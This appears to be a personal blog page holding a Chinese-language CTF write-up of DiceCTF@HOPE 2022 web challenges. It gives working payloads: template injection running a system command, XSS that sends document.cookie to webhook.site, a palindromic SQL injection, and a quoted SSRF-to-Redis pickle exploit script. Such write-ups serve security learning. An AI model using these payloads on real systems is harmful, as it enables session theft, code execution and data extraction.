<!DOCTYPE html>
<head>
    

<meta charset="utf-8">
<meta name="copyright" content="BASE">
<title>Siebene@ Blog</title>

<link rel='icon' type='image/png' href='/images/logo.png' />
<link rel='apple-touch-icon' sizes='180x180' href='/images/logo.png' />
<link rel='apple-touch-icon-precomposed' href='/images/logo.png' />


<link rel='canonical' href='/' />



<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0">


<meta http-equiv="X-UA-Compatible" content="IE=8 ; IE=9">
<meta name="description" content="New &amp; Used Clothing / Design Office" />
<meta name="keywords" content="Siebene@ Blog,Siebene@,siebene@" />
<meta property="fb:app_id" content="350947278320210" />
<meta property="og:description" content="Siebene@ Blog" />
<meta property="og:title" content="Siebene@ Blog " />
<meta property="og:image" content="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" />
<meta property="og:url" content="/" />
<meta property="og:site_name" content="Siebene@ Blog " />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@Siebene7" />
<meta name="twitter:url" content="/" />
<meta name="twitter:title" content="Siebene@ Blog " />
<meta name="twitter:description" content="Siebene@ Blog" />
<meta name="twitter:image" content="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" />


<link rel="stylesheet" type="text/css" href="/css/search.css">

<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>

<link rel="stylesheet" type="text/css" href="/css/base.css">
<link rel="stylesheet" type="text/css" href="/css/windows.css">
<link rel="stylesheet" type="text/css" href="/css/BASEshop-24515246fb087d964f79.css"/>
<link rel="stylesheet" type="text/css" href="/css/github-markdown.css">

<style type="text/css">
body { 
        background-image: url("/images/bg.avif");     
        background-size: cover;
        background-attachment: fixed;
        background-repeat: no-repeat;
    }
</style>

<!-- metaCSS -->
<style type="text/css">
    .fontsize24 {
        font-size: 24px;
    }
    .fontsize28 {
        font-size: 28px;
    }
    .fontsize32 {
        font-size: 32px;
    }
    .fontsize36 {
        font-size: 36px;
    }
    .fontsize40 {
        font-size: 40px;
    }
    #logo.mincho, #windowHeader h1.mincho {
        font-family: "Hiragino Mincho ProN","Hiragino Mincho Pro",HGS明朝E,メイリオ,Meiryo,serif!important;
    }
    #logo.gothic, #windowHeader h1.gothic {
        font-family: 'Hiragino Kaku Gothic ProN','ヒラギノ角ゴ ProN W3',Meiryo,メイリオ,Osaka,'MS PGothic',arial,helvetica,sans-serif!important;
    }

    .appsItemCategoryTag_lowerLink {
        color: #1E2A86;
    }
        
    .logo_window h1 { font-family: 'Lato'; }
    .sp_logo h1 { font-family: 'Lato'; }
    
    /* ウィンドウヘッダーカラー */
    .window_header{
        background: navy;
    }
    .item_box section a {
        border-top: 24px solid navy;
    }
    @media screen and (max-width: 896px) {
        .item_box section a {
            border-top: none;
        }
    }
    .item_window_header{
    background: navy;
    }
</style>

<link rel="stylesheet" type="text/css" href="/css/label.css">

<meta name="cot:primaryColor" content="#000000">
<meta name="cot:accentColor" content="#000000">
<meta name="cot:textColor" content="#000000">
<meta name="cot:lightTextColor" content="#ffffff">
<meta name="cot:complementaryColor" content="#1E2A86">
<meta name="cot:titleColor" content="#000000">


<script src='/js/jquery.min.js'></script>
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div class="page">
    <div id="rightbar">
        <div class="sp sp_logo">
            <h1 class="fontsize32"><a href="/" id="logo" class="nothing"><img class="logoImage"
                        src="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif"
                        alt="Siebene@ Blog"></a></h1>
            <p class="tagline">おかえりなさい</p>
        </div>
        <!-- メニュー -->
        <div id="nav-drawer">
            <input id="nav-input" type="checkbox" class="nav-unshown">
                <label class="nav-unshown" id="nav-close" for="nav-input"></label>
                <label id="nav-open" for="nav-input">
                    <span></span>
                </label>

            <div id="sideContainer">
                <div class="pc logo_window">
                    <div class="window_header">
                        <span>Siebene@ Blog</span>
                        <div class="window_close">
                            <span></span>
                        </div>
                    </div>
                    <h1 class="fontsize32">
                        <a href="/" id="logo" class="nothing"><img class="logoImage" src="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" alt="Siebene@ Blog">
                        </a>
                    </h1>
                    <p class="tagline">おかえりなさい</p>
                </div>

                <header id="windowHeader" class="hidden">
                    <div class="window_header">
                        <span>Menu</span>
                        <label for="nav-input">
                            <div class="window_close">
                                <span></span>
                            </div>
                        </label>
                    </div>

                    <div class="menu_window_container">
                        <div id="leftbar">
                            <div id="leftContent">
                                <nav id="global">
                                    <ul>
                                        <li id="home"><a class="mainHeaderNavColor" href="/">HOME</a></li>
                                        <li><a class="mainHeaderNavColor" href="/about">ABOUT</a></li>
                                        <li></li>
                                        <li class="languageSelect">
                                            <div id="i18" class="clearfix">
                                            </div>
                                        </li>
                                        <li class="sp"><a class="windowFooterNav" href="/">Privacy Policy</a></li>
                                        <li class="sp"><a class="windowFooterNav" href="/">Act on Specified Commercial Transactions</a></li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
        </div>
        
        <div id="item_page_wrap">
            <section class="radius_box">
                <div id="second_column">
                    <div class="window_header">
                        <span>Spec</span>
                        <div class="window_close"><span></span></div>
                    </div>
                    <div class="item_page_window_container">
                        <div id="item_detail">
                            <p>DiceCTF@HOPE-WriteUps</p>
                            <br>
                            <p>2022-07-25</p>
                            <section class="markdown-body">
                                <h3 id="secure-page"><a href="#secure-page" class="headerlink" title="secure-page"></a>secure-page</h3><p>set cookie admin&#x3D;true</p>
<h3 id="reverser"><a href="#reverser" class="headerlink" title="reverser"></a>reverser</h3><p>只需要reverse一下payload就好啦</p>
<p>payload:<code>&#123;&#123;request.application.__globals__.__builtins__.__import__('os').popen('id').read()&#125;&#125;</code></p>
<h3 id="flag-viewer"><a href="#flag-viewer" class="headerlink" title="flag-viewer"></a>flag-viewer</h3><p>post &#x2F;flag with <code>user=admin</code></p>
<h3 id="pastebin"><a href="#pastebin" class="headerlink" title="pastebin"></a>pastebin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.mc.ax/flash?message=&lt;/div&gt;&lt;img src=1 onerror=navigator.sendBeacon(`https://webhook.site/42835022-42ff-42a3-873c-1df627e672bc`,document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<p>另一種做法也蠻簡單的，新建檔案，填入如下内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;s&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&lt;/script</span></span><br><span class="line"><span class="language-javascript">&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="point"><a href="#point" class="headerlink" title="point"></a>point</h3><p>post &#x2F; with <code>Whatpoint=that_point</code></p>
<p>利用了Go對於json大小寫的處理</p>
<h3 id="oeps"><a href="#oeps" class="headerlink" title="oeps"></a>oeps</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.post(<span class="params"><span class="string">&#x27;/submit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">request</span>):</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    logged_in = (</span><br><span class="line">        <span class="built_in">all</span>(c <span class="keyword">in</span> ALLOWED_CHARACTERS <span class="keyword">for</span> c <span class="keyword">in</span> token) <span class="keyword">and</span></span><br><span class="line">        <span class="built_in">len</span>(connection.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            select * from users where token = &#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % token).fetchall()) == <span class="number">1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logged_in:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Authentication error.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="keyword">await</span> request.post()</span><br><span class="line">    submission = data.get(<span class="string">&#x27;submission&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> submission == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Submission cannot be empty.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    stripped = submission.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> stripped != stripped[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Submission must be a palindrome.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    connection.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        insert into pending (user, sentence) values (&#x27;%s&#x27;, &#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (</span><br><span class="line">        token,</span><br><span class="line">        submission</span><br><span class="line">    ))</span><br></pre></td></tr></table></figure>

<p>想辦法構造回文字串的就可以注入了</p>
<p><code>submission=&#39;||(SELECT flag FROM flags))--))sgalf MORF galf TCELES(||&#39;</code></p>
<h3 id="inspect-me"><a href="#inspect-me" class="headerlink" title="inspect-me"></a>inspect-me</h3><p>從disord上看到的一個問答</p>
<blockquote>
<p>Q: how does the backend detect the <code>view-source:</code> url?</p>
<p>A: so it waits for the background image request before sending the rest of the response? quite clever</p>
</blockquote>
<p><code>https://chrome.google.com/webstore/detail/allow-right-click/hompjdfbfmmmgflfjdlnkohcplmboaeo</code>這個蠻好用的</p>
<h3 id="mk"><a href="#mk" class="headerlink" title="mk"></a>mk</h3><p><code>https://unsafe.hen.ne.ke/labs/mathjax-csp/</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mk.mc.ax/render?content=%3Ciframe%20srcdoc%3D%27%3Cscript%20type%3D%22text%2fjavascript%22%20src%3D%22%2fMathJax%2fMathJax.js%3Fconfig%3DTeX-MML-AM_CHTML%22%3E%3C%2fscript%3E%3Cscript%20type%3D%22text%2fx-mathjax-config%22%3E%20%20window.parent.document.location%3D%22https%3A%2f%2fwebhook.site%2f287ff1e8-1842-4e1b-b04c-87c138f31d85%3F%22%2bdocument.cookie%3C%2fscript%3E%27%3E%3C%2fiframe%3E</span><br></pre></td></tr></table></figure>

<p>使用iframe srcdoc是爲了解決在<code>index.html</code>裏面<code>output.innerHTML = res</code>這裏的觸發</p>
<p>當然可以這樣</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mk.mc.ax/render?content=%3Cscript%20type%3D%22text%2fx-mathjax-config%22%3Ealert%281%29%3C%2fscript%3E%20%3Cscript%20type%3D%22text%2fjavascript%22%20async%20src%3D%22%2fMathJax%2fMathJax.js%3Fconfig%3DTeX-AMS_CHTML%22%3E%3C%2fscript%3E</span><br></pre></td></tr></table></figure>

<h3 id="your-space-復現"><a href="#your-space-復現" class="headerlink" title="your-space(復現)"></a>your-space(復現)</h3><p>有一个直接的ssrf在<code>creat space</code>的时候会触发</p>
<p>本地的起个服务看了看redis的内容，发现好像没有session相关的用户态数据存在(登录处理)。问题就变成了他会缓存那些信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cache.memoize(<span class="params">timeout=<span class="number">60</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num_subscriptions</span>(<span class="params">space_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(Subscription.query.filter_by(space_id=space_id).<span class="built_in">all</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@space.route(<span class="params"><span class="string">&quot;/space/&lt;space_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">space_id</span>):</span><br><span class="line">    space = Space.query.get(space_id)</span><br><span class="line">    <span class="keyword">if</span> space <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">    subscribed = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        subscribed = get_subscription(current_user, space) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    subs = num_subscriptions(space.<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;space.html&quot;</span>, subscribed=subscribed, subs=subs, space=space)</span><br></pre></td></tr></table></figure>

<p>字面意思会缓存<code>num_subscriptions</code>这个函数，访问<code>/space/&lt;space_id&gt;</code>60秒内可以在redis里面查看下缓存，并用 <code>pickletools.dis</code>查看下序列化的内容。正常功能的情况下，redis会出现如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask_cache_app.routes.space.num_subscriptions_memver =&gt; !\x80\x05\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06xxxxx\x94.</span><br><span class="line"></span><br><span class="line">flask_cache_xk28vUr8TTGcOgNTxxxxx =&gt; </span><br><span class="line">!\x80\x05K\x01.</span><br></pre></td></tr></table></figure>

<p>用<code>pickletools.dis</code>打印下值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pickletools.dis(b&quot;\x80\x05K\x00.&quot;)</span><br><span class="line">    0: \x80 PROTO      5</span><br><span class="line">    2: K    BININT1    0</span><br><span class="line">    4: .    STOP</span><br><span class="line">&gt;&gt;&gt; pickletools.dis(b&quot;\x80\x05\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06x3mREg\x94.&quot;)</span><br><span class="line">    0: \x80 PROTO      5</span><br><span class="line">    2: \x95 FRAME      10</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;x3mREg&#x27;</span><br><span class="line">   19: \x94 MEMOIZE    (as 0)</span><br><span class="line">   20: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure>

<p>通过redis的内容以及合理的猜测(实际上是太菜了，懒得看源码)</p>
<p><code>flask_cache_app.routes.space.num_subscriptions_memver</code>里面会出现一个xxxx的后缀，这个应该与<code>flask_cache_xk28vUr8TTGcOgNTxxxxx</code>有关，而<code>flask_cache_xk28vUr8TTGcOgNTxxxxx</code>应该就是订阅的数量（可能这个键的值就是上面哪个函数的返回值?），这个例子里面是0</p>
<p>所以将<code>flask_cache_app.routes.space.num_subscriptions_memver</code>值里面的<code>x3mREg</code>改成任意一个<code>xxxxx</code>，接着再设置一个<code>flask_cache_xk28vUr8TTGcOgNTxxxxx</code>为<code>!capp\nflag\n.</code>就好了。后面渲染的过程会去获取这个订阅的数量，也就是<code>from app import flag</code></p>
<p>还有个细节就是<code>flask_cache_app.routes.space.num_subscriptions_memver</code>要设置成下面脚本的内容，不然会被覆盖。具体原理要看源码吧，我就没看了</p>
<p><strong>贴一个别人的脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">base = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="comment"># base = &#x27;https://web-your-space-a735d6e0460cc29c.mc.ax&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.post(base+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;meow&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;meow&quot;</span>&#125;)</span><br><span class="line">session.post(base+<span class="string">&quot;/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;meow&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;meow&quot;</span>&#125;)</span><br><span class="line">session.post(base+<span class="string">&quot;/create&quot;</span>, data=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;meow&quot;</span>&#125;)</span><br><span class="line">session.get(base+<span class="string">&quot;/space/1/sub&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">pkl = <span class="string">r&#x27;&quot;!V\n.&quot;&#x27;</span> <span class="comment"># empty string</span></span><br><span class="line">webhook = <span class="string">&quot;dict://redis:6379/SET:flask_cache_app.routes.space.num_subscriptions_memver:&quot;</span> + pkl</span><br><span class="line"><span class="built_in">print</span>(webhook, <span class="built_in">len</span>(webhook))</span><br><span class="line">session.post(base+<span class="string">&quot;/profile&quot;</span>, data=&#123;<span class="string">&quot;webhook&quot;</span>: webhook&#125;).text</span><br><span class="line">session.post(base+<span class="string">&quot;/space/1/post&quot;</span>, data=&#123;<span class="string">&quot;content&quot;</span>: secrets.token_hex(<span class="number">8</span>)&#125;)</span><br><span class="line">session.get(base+<span class="string">&quot;/space/1&quot;</span>) <span class="comment"># trigger ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">pkl2 = <span class="string">r&#x27;&quot;!capp\nflag\n.&quot;&#x27;</span> <span class="comment"># from app import flag</span></span><br><span class="line">webhook = <span class="string">&quot;dict://redis:6379/SET:flask_cache_xk28vUr8TTGcOgNT:&quot;</span> + pkl2</span><br><span class="line"><span class="built_in">print</span>(webhook, <span class="built_in">len</span>(webhook))</span><br><span class="line">session.post(base+<span class="string">&quot;/profile&quot;</span>, data=&#123;<span class="string">&quot;webhook&quot;</span>: webhook&#125;).text</span><br><span class="line">session.post(base+<span class="string">&quot;/space/1/post&quot;</span>, data=&#123;<span class="string">&quot;content&quot;</span>: secrets.token_hex(<span class="number">8</span>)&#125;)</span><br><span class="line">session.get(base+<span class="string">&quot;/space/1&quot;</span>).text <span class="comment"># trigger ssrf</span></span><br><span class="line"><span class="built_in">print</span>(session.get(base+<span class="string">&quot;/space/1&quot;</span>).text)</span><br></pre></td></tr></table></figure>

<h3 id="payment-pal-复现"><a href="#payment-pal-复现" class="headerlink" title="payment-pal(复现)"></a>payment-pal(复现)</h3><p>这个题太难了，看官方wp吧</p>
<p><a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_at_hope_2022_writeups">https://brycec.me/posts/dicectf_at_hope_2022_writeups</a></p>

                            </section>
                        </div>
                        <input type="hidden" name="AdditionalItemDetailDefaultCssAndJs" value="true">
                    </div>
                </div>
            </section>
        <!-- ショップレビュー -->
        </div>
        <br class="clear">
    </div>
</div>
</body>
    <footer id="windowFooter">
    <nav id="info">
        <ul class="clearfix">
            <li><a class="windowFooterNav" href="/">HOME</a></li>
            <li class="pc"><a class="windowFooterNav" href="/">Privacy Policy</a></li>
            <li class="pc"><a class="windowFooterNav" href="/">Act on Specified Commercial Transactions</a></li>
            <li>
                <div class="socialBtnList clearfix boxRight">
                    <div class="fb sns">
                        <div class="fb-share-button" data-href="/" data-layout="button_count" data-size="small" data-mobile-iframe="true"><a class="fb-xfbml-parse-ignore" target="_blank" href="https://github.com/Siebene">Github</a></div>
                    </div>
                    <div class="tw sns">
                        <a target="_blank" rel="noopener" href="https://x.com/Siebene7" class="twitter-share-button" data-url="https://x.com/Siebene7" data-lang="ja" data-hashtags="" data-via="Siebene@" data-text="Siebene@ Blog">Twitter!</a>
                    </div>
                </div>
            </li>
        </ul>
    </nav>
</footer>
<input id="base_url" type="hidden" value="/">

<script type="text/javascript">
    $(function() {
        var imgs = $("#slideshow > li");
        var imgLen = imgs.length;
        var count = 0;
        function changeImg() {
            count = (count + 1) % imgLen;
            imgs.removeClass("showSlide").eq(count).addClass("showSlide");
        }
        setInterval(changeImg, 4000);
    })
</script>
</html>